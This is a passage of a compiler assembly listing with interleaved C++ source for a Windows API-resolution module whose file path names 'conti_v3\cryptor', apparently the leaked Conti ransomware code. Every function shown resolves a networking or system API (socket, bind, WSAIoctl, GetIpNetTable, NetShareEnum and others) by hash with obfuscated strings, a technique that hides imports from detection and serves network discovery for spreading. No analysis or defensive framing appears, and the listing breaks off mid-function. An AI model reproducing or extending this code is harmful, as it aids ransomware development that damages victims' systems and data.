  00049	8b 85 20 01 00
	00		 mov	 eax, DWORD PTR optlen$[rbp]
  0004f	89 44 24 20	 mov	 DWORD PTR [rsp+32], eax
  00053	4c 8b 8d 18 01
	00 00		 mov	 r9, QWORD PTR optval$[rbp]
  0005a	44 8b 85 10 01
	00 00		 mov	 r8d, DWORD PTR optname$[rbp]
  00061	8b 95 08 01 00
	00		 mov	 edx, DWORD PTR level$[rbp]
  00067	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR s$[rbp]
  0006e	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 936  : }

  00071	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00078	5f		 pop	 rdi
  00079	5d		 pop	 rbp
  0007a	c3		 ret	 0
?psetsockopt@@YAH_KHHPEBDH@Z ENDP			; psetsockopt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pbind@@YAH_KPEBUsockaddr@@H@Z
_TEXT	SEGMENT
pFunction$ = 8
s$ = 256
addr$ = 264
namelen$ = 272
?pbind@@YAH_KPEBUsockaddr@@H@Z PROC			; pbind, COMDAT

; 919  : {

$LN3:
  00000	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 920  : 	int(WINAPI * pFunction)(SOCKET, const sockaddr*, int);
; 921  : 	pFunction = (int(WINAPI*)(SOCKET, const sockaddr*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x6291cb76, 31);//GetProcAddress(hWs2_32, OBFA("bind"));

  00029	41 b9 1f 00 00
	00		 mov	 r9d, 31
  0002f	41 b8 76 cb 91
	62		 mov	 r8d, 1653721974		; 6291cb76H
  00035	ba 15 00 00 00	 mov	 edx, 21
  0003a	33 c9		 xor	 ecx, ecx
  0003c	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00041	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 922  : 	return pFunction(s, addr, namelen);

  00045	44 8b 85 10 01
	00 00		 mov	 r8d, DWORD PTR namelen$[rbp]
  0004c	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR addr$[rbp]
  00053	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR s$[rbp]
  0005a	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 923  : }

  0005d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00064	5f		 pop	 rdi
  00065	5d		 pop	 rbp
  00066	c3		 ret	 0
?pbind@@YAH_KPEBUsockaddr@@H@Z ENDP			; pbind
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWSASocketW@@YA_KHHHPEAU_WSAPROTOCOL_INFOW@@IK@Z
_TEXT	SEGMENT
pFunction$ = 8
af$ = 256
type$ = 264
protocol$ = 272
lpProtocolInfo$ = 280
g$ = 288
dwFlags$ = 296
?pWSASocketW@@YA_KHHHPEAU_WSAPROTOCOL_INFOW@@IK@Z PROC	; pWSASocketW, COMDAT

; 908  : {

$LN3:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  0000a	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  0000e	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00012	55		 push	 rbp
  00013	57		 push	 rdi
  00014	48 81 ec 18 01
	00 00		 sub	 rsp, 280		; 00000118H
  0001b	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  00020	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00027	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 909  : 	SOCKET(WINAPI * pFunction)(int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD);
; 910  : 	pFunction = (SOCKET(WINAPI*)(int, int, int, LPWSAPROTOCOL_INFOW, GROUP, DWORD))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0xa7922856, 32);//GetProcAddress(hWs2_32, OBFA("WSASocketW"));

  0002c	41 b9 20 00 00
	00		 mov	 r9d, 32			; 00000020H
  00032	41 b8 56 28 92
	a7		 mov	 r8d, -1483593642	; a7922856H
  00038	ba 15 00 00 00	 mov	 edx, 21
  0003d	33 c9		 xor	 ecx, ecx
  0003f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00044	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 911  : 	return pFunction(af, type, protocol, lpProtocolInfo, g, dwFlags);

  00048	8b 85 28 01 00
	00		 mov	 eax, DWORD PTR dwFlags$[rbp]
  0004e	89 44 24 28	 mov	 DWORD PTR [rsp+40], eax
  00052	8b 85 20 01 00
	00		 mov	 eax, DWORD PTR g$[rbp]
  00058	89 44 24 20	 mov	 DWORD PTR [rsp+32], eax
  0005c	4c 8b 8d 18 01
	00 00		 mov	 r9, QWORD PTR lpProtocolInfo$[rbp]
  00063	44 8b 85 10 01
	00 00		 mov	 r8d, DWORD PTR protocol$[rbp]
  0006a	8b 95 08 01 00
	00		 mov	 edx, DWORD PTR type$[rbp]
  00070	8b 8d 00 01 00
	00		 mov	 ecx, DWORD PTR af$[rbp]
  00076	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 912  : }

  00079	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00080	5f		 pop	 rdi
  00081	5d		 pop	 rbp
  00082	c3		 ret	 0
?pWSASocketW@@YA_KHHHPEAU_WSAPROTOCOL_INFOW@@IK@Z ENDP	; pWSASocketW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWSAAddressToStringW@@YAHPEAUsockaddr@@KPEAU_WSAPROTOCOL_INFOW@@PEA_WPEAK@Z
_TEXT	SEGMENT
pFunction$ = 8
lpsaAddress$ = 256
dwAddressLength$ = 264
lpProtocolInfo$ = 272
lpszAddressString$ = 280
lpdwAddressStringLength$ = 288
?pWSAAddressToStringW@@YAHPEAUsockaddr@@KPEAU_WSAPROTOCOL_INFOW@@PEA_WPEAK@Z PROC ; pWSAAddressToStringW, COMDAT

; 894  : {

$LN3:
  00000	4c 89 4c 24 20	 mov	 QWORD PTR [rsp+32], r9
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  0000e	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00013	55		 push	 rbp
  00014	57		 push	 rdi
  00015	48 81 ec 18 01
	00 00		 sub	 rsp, 280		; 00000118H
  0001c	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  00021	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00028	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 895  : 	int(WINAPI * pFunction)(LPSOCKADDR, DWORD, LPWSAPROTOCOL_INFOW, LPWSTR, LPDWORD);
; 896  : 	pFunction = (int(WINAPI*)(LPSOCKADDR, DWORD, LPWSAPROTOCOL_INFOW, LPWSTR, LPDWORD))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x6ae189ea, 33);//GetProcAddress(hWs2_32, OBFA("WSAAddressToStringW"));

  0002d	41 b9 21 00 00
	00		 mov	 r9d, 33			; 00000021H
  00033	41 b8 ea 89 e1
	6a		 mov	 r8d, 1793165802		; 6ae189eaH
  00039	ba 15 00 00 00	 mov	 edx, 21
  0003e	33 c9		 xor	 ecx, ecx
  00040	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00045	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 897  : 	return pFunction(lpsaAddress, dwAddressLength, lpProtocolInfo, lpszAddressString, lpdwAddressStringLength);

  00049	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR lpdwAddressStringLength$[rbp]
  00050	48 89 44 24 20	 mov	 QWORD PTR [rsp+32], rax
  00055	4c 8b 8d 18 01
	00 00		 mov	 r9, QWORD PTR lpszAddressString$[rbp]
  0005c	4c 8b 85 10 01
	00 00		 mov	 r8, QWORD PTR lpProtocolInfo$[rbp]
  00063	8b 95 08 01 00
	00		 mov	 edx, DWORD PTR dwAddressLength$[rbp]
  00069	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR lpsaAddress$[rbp]
  00070	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 898  : }

  00073	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0007a	5f		 pop	 rdi
  0007b	5d		 pop	 rbp
  0007c	c3		 ret	 0
?pWSAAddressToStringW@@YAHPEAUsockaddr@@KPEAU_WSAPROTOCOL_INFOW@@PEA_WPEAK@Z ENDP ; pWSAAddressToStringW
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pclosesocket@@YAH_K@Z
_TEXT	SEGMENT
pFunction$ = 8
s$ = 256
?pclosesocket@@YAH_K@Z PROC				; pclosesocket, COMDAT

; 881  : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 882  : 	int(WINAPI * pFunction)(SOCKET);
; 883  : 	pFunction = (int(WINAPI*)(SOCKET))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x3e3c66ba, 34);//GetProcAddress(hWs2_32, OBFA("closesocket"));

  0001f	41 b9 22 00 00
	00		 mov	 r9d, 34			; 00000022H
  00025	41 b8 ba 66 3c
	3e		 mov	 r8d, 1044145850		; 3e3c66baH
  0002b	ba 15 00 00 00	 mov	 edx, 21
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 884  : 	return pFunction(s);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR s$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 885  : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pclosesocket@@YAH_K@Z ENDP				; pclosesocket
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pWSAIoctl@@YAH_KKPEAXK1KPEAKPEAU_OVERLAPPED@@P6AXKK3K@Z@Z
_TEXT	SEGMENT
pFunction$ = 8
s$ = 256
dwIoControlCode$ = 264
lpvInBuffer$ = 272
cbInBuffer$ = 280
lpvOutBuffer$ = 288
cbOutBuffer$ = 296
lpcbBytesReturned$ = 304
lpOverlapped$ = 312
lpCompletionRoutine$ = 320
?pWSAIoctl@@YAH_KKPEAXK1KPEAKPEAU_OVERLAPPED@@P6AXKK3K@Z@Z PROC ; pWSAIoctl, COMDAT

; 872  : {

$LN3:
  00000	44 89 4c 24 20	 mov	 DWORD PTR [rsp+32], r9d
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  0000e	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00013	55		 push	 rbp
  00014	57		 push	 rdi
  00015	48 81 ec 38 01
	00 00		 sub	 rsp, 312		; 00000138H
  0001c	48 8d 6c 24 50	 lea	 rbp, QWORD PTR [rsp+80]
  00021	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00028	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 873  : 	int(WINAPI * pFunction)(SOCKET, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE);
; 874  : 	pFunction = (int(WINAPI*)(SOCKET, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8460e293, 35);//GetProcAddress(hWs2_32, OBFA("WSAIoctl"));

  0002d	41 b9 23 00 00
	00		 mov	 r9d, 35			; 00000023H
  00033	41 b8 93 e2 60
	84		 mov	 r8d, -2074025325	; 8460e293H
  00039	ba 15 00 00 00	 mov	 edx, 21
  0003e	33 c9		 xor	 ecx, ecx
  00040	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00045	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 875  : 	return pFunction(s, dwIoControlCode, lpvInBuffer, cbInBuffer, lpvOutBuffer, cbOutBuffer, lpcbBytesReturned, lpOverlapped, lpCompletionRoutine);

  00049	48 8b 85 40 01
	00 00		 mov	 rax, QWORD PTR lpCompletionRoutine$[rbp]
  00050	48 89 44 24 40	 mov	 QWORD PTR [rsp+64], rax
  00055	48 8b 85 38 01
	00 00		 mov	 rax, QWORD PTR lpOverlapped$[rbp]
  0005c	48 89 44 24 38	 mov	 QWORD PTR [rsp+56], rax
  00061	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR lpcbBytesReturned$[rbp]
  00068	48 89 44 24 30	 mov	 QWORD PTR [rsp+48], rax
  0006d	8b 85 28 01 00
	00		 mov	 eax, DWORD PTR cbOutBuffer$[rbp]
  00073	89 44 24 28	 mov	 DWORD PTR [rsp+40], eax
  00077	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR lpvOutBuffer$[rbp]
  0007e	48 89 44 24 20	 mov	 QWORD PTR [rsp+32], rax
  00083	44 8b 8d 18 01
	00 00		 mov	 r9d, DWORD PTR cbInBuffer$[rbp]
  0008a	4c 8b 85 10 01
	00 00		 mov	 r8, QWORD PTR lpvInBuffer$[rbp]
  00091	8b 95 08 01 00
	00		 mov	 edx, DWORD PTR dwIoControlCode$[rbp]
  00097	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR s$[rbp]
  0009e	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 876  : }

  000a1	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  000a8	5f		 pop	 rdi
  000a9	5d		 pop	 rbp
  000aa	c3		 ret	 0
?pWSAIoctl@@YAH_KKPEAXK1KPEAKPEAU_OVERLAPPED@@P6AXKK3K@Z@Z ENDP ; pWSAIoctl
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pgethostname@@YAHPEADH@Z
_TEXT	SEGMENT
pFunction$ = 8
name$ = 256
namelen$ = 264
?pgethostname@@YAHPEADH@Z PROC				; pgethostname, COMDAT

; 843  : {

$LN3:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 844  : 	int (WINAPI * pFunction)(char*, int);
; 845  : 	pFunction = (int (WINAPI*)(char*, int))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x8ec21b05, 37);//GetProcAddress(hWs2_32, OBFA("gethostname"));

  00023	41 b9 25 00 00
	00		 mov	 r9d, 37			; 00000025H
  00029	41 b8 05 1b c2
	8e		 mov	 r8d, -1899881723	; 8ec21b05H
  0002f	ba 15 00 00 00	 mov	 edx, 21
  00034	33 c9		 xor	 ecx, ecx
  00036	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  0003b	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 846  : 	return pFunction(name, namelen);

  0003f	8b 95 08 01 00
	00		 mov	 edx, DWORD PTR namelen$[rbp]
  00045	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR name$[rbp]
  0004c	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 847  : }

  0004f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00056	5f		 pop	 rdi
  00057	5d		 pop	 rbp
  00058	c3		 ret	 0
?pgethostname@@YAHPEADH@Z ENDP				; pgethostname
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pgethostbyname@@YAPEAUhostent@@PEBD@Z
_TEXT	SEGMENT
pFunction$ = 8
name$ = 256
?pgethostbyname@@YAPEAUhostent@@PEBD@Z PROC		; pgethostbyname, COMDAT

; 833  : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 834  : 	hostent* (WINAPI * pFunction)(const char*);
; 835  : 	pFunction = (hostent * (WINAPI*)(const char*))getapi::GetProcAddressEx2(NULL, WS2_32_MODULE_ID, 0x3f6d3769, 38);//GetProcAddress(hWs2_32, OBFA("gethostbyname"));

  0001f	41 b9 26 00 00
	00		 mov	 r9d, 38			; 00000026H
  00025	41 b8 69 37 6d
	3f		 mov	 r8d, 1064122217		; 3f6d3769H
  0002b	ba 15 00 00 00	 mov	 edx, 21
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 836  : 	return pFunction(name);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR name$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 837  : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pgethostbyname@@YAPEAUhostent@@PEBD@Z ENDP		; pgethostbyname
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pGetIpNetTable@@YAKPEAU_MIB_IPNETTABLE@@PEAKH@Z
_TEXT	SEGMENT
pFunction$ = 8
IpNetTable$ = 256
SizePointer$ = 264
Order$ = 272
?pGetIpNetTable@@YAKPEAU_MIB_IPNETTABLE@@PEAKH@Z PROC	; pGetIpNetTable, COMDAT

; 690  : {

$LN3:
  00000	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 691  : 	ULONG(WINAPI * pFunction)(PMIB_IPNETTABLE, PULONG, BOOL);
; 692  : 	pFunction = (ULONG(WINAPI*)(PMIB_IPNETTABLE, PULONG, BOOL))getapi::GetProcAddressEx2(NULL, IPHLPAPI_MODULE_ID, 0xeae677e7, 49);//GetProcAddress(hIphlp32, OBFA("GetIpNetTable"));

  00029	41 b9 31 00 00
	00		 mov	 r9d, 49			; 00000031H
  0002f	41 b8 e7 77 e6
	ea		 mov	 r8d, -353994777		; eae677e7H
  00035	ba 12 00 00 00	 mov	 edx, 18
  0003a	33 c9		 xor	 ecx, ecx
  0003c	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00041	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 693  : 	return pFunction(IpNetTable, SizePointer, Order);

  00045	44 8b 85 10 01
	00 00		 mov	 r8d, DWORD PTR Order$[rbp]
  0004c	48 8b 95 08 01
	00 00		 mov	 rdx, QWORD PTR SizePointer$[rbp]
  00053	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR IpNetTable$[rbp]
  0005a	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 694  : }

  0005d	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00064	5f		 pop	 rdi
  00065	5d		 pop	 rbp
  00066	c3		 ret	 0
?pGetIpNetTable@@YAKPEAU_MIB_IPNETTABLE@@PEAKH@Z ENDP	; pGetIpNetTable
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pNetShareEnum@@YAKPEA_WKPEAPEAEKPEAK22@Z
_TEXT	SEGMENT
pFunction$ = 8
servername$ = 256
level$ = 264
bufptr$ = 272
prefmaxlen$ = 280
entriesread$ = 288
totalentries$ = 296
resume_handle$ = 304
?pNetShareEnum@@YAKPEA_WKPEAPEAEKPEAK22@Z PROC		; pNetShareEnum, COMDAT

; 678  : {

$LN3:
  00000	44 89 4c 24 20	 mov	 DWORD PTR [rsp+32], r9d
  00005	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  0000a	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  0000e	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00013	55		 push	 rbp
  00014	57		 push	 rdi
  00015	48 81 ec 28 01
	00 00		 sub	 rsp, 296		; 00000128H
  0001c	48 8d 6c 24 40	 lea	 rbp, QWORD PTR [rsp+64]
  00021	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00028	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 679  : 	DWORD(WINAPI * pFunction)(WCHAR*, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, LPDWORD);
; 680  : 	pFunction = (DWORD(WINAPI*)(WCHAR*, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, LPDWORD))getapi::GetProcAddressEx2(NULL, NETAPI32_MODULE_ID, 0x40d14d9a, 50);//GetProcAddress(hNetApi32, OBFA("NetShareEnum"));

  0002d	41 b9 32 00 00
	00		 mov	 r9d, 50			; 00000032H
  00033	41 b8 9a 4d d1
	40		 mov	 r8d, 1087458714		; 40d14d9aH
  00039	ba 11 00 00 00	 mov	 edx, 17
  0003e	33 c9		 xor	 ecx, ecx
  00040	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00045	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 681  : 	return pFunction(servername, level, bufptr, prefmaxlen, entriesread, totalentries, resume_handle);

  00049	48 8b 85 30 01
	00 00		 mov	 rax, QWORD PTR resume_handle$[rbp]
  00050	48 89 44 24 30	 mov	 QWORD PTR [rsp+48], rax
  00055	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR totalentries$[rbp]
  0005c	48 89 44 24 28	 mov	 QWORD PTR [rsp+40], rax
  00061	48 8b 85 20 01
	00 00		 mov	 rax, QWORD PTR entriesread$[rbp]
  00068	48 89 44 24 20	 mov	 QWORD PTR [rsp+32], rax
  0006d	44 8b 8d 18 01
	00 00		 mov	 r9d, DWORD PTR prefmaxlen$[rbp]
  00074	4c 8b 85 10 01
	00 00		 mov	 r8, QWORD PTR bufptr$[rbp]
  0007b	8b 95 08 01 00
	00		 mov	 edx, DWORD PTR level$[rbp]
  00081	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR servername$[rbp]
  00088	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 682  : }

  0008b	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00092	5f		 pop	 rdi
  00093	5d		 pop	 rbp
  00094	c3		 ret	 0
?pNetShareEnum@@YAKPEA_WKPEAPEAEKPEAK22@Z ENDP		; pNetShareEnum
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pNetApiBufferFree@@YAKPEAX@Z
_TEXT	SEGMENT
pFunction$ = 8
Buffer$ = 256
?pNetApiBufferFree@@YAKPEAX@Z PROC			; pNetApiBufferFree, COMDAT

; 663  : {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 664  : 	DWORD(WINAPI * pFunction)(LPVOID);
; 665  : 	pFunction = (DWORD(WINAPI*)(LPVOID))getapi::GetProcAddressEx2(NULL, NETAPI32_MODULE_ID, 0x09223458, 51);//GetProcAddress(hNetApi32, OBFA("NetApiBufferFree"));

  0001f	41 b9 33 00 00
	00		 mov	 r9d, 51			; 00000033H
  00025	41 b8 58 34 22
	09		 mov	 r8d, 153236568		; 09223458H
  0002b	ba 11 00 00 00	 mov	 edx, 17
  00030	33 c9		 xor	 ecx, ecx
  00032	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
  00037	48 89 45 08	 mov	 QWORD PTR pFunction$[rbp], rax

; 666  : 	return pFunction(Buffer);

  0003b	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR Buffer$[rbp]
  00042	ff 55 08	 call	 QWORD PTR pFunction$[rbp]

; 667  : }

  00045	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0004c	5f		 pop	 rdi
  0004d	5d		 pop	 rbp
  0004e	c3		 ret	 0
?pNetApiBufferFree@@YAKPEAX@Z ENDP			; pNetApiBufferFree
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
;	COMDAT ?pCreateTimerQueue@@YAPEAXXZ
_TEXT	SEGMENT
pFunction$ = 8
?pCreateTimerQueue@@YAPEAXXZ PROC			; pCreateTimerQueue, COMDAT

; 512  : {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__9B49ECA4_getapi@h
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 513  : 	HANDLE(WINAPI * pFunction)();
; 514  : 	pFunction = (HANDLE(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x071a6760, 64);//GetProcAddress(hKernel32, OBFA("CreateTimerQueue"));

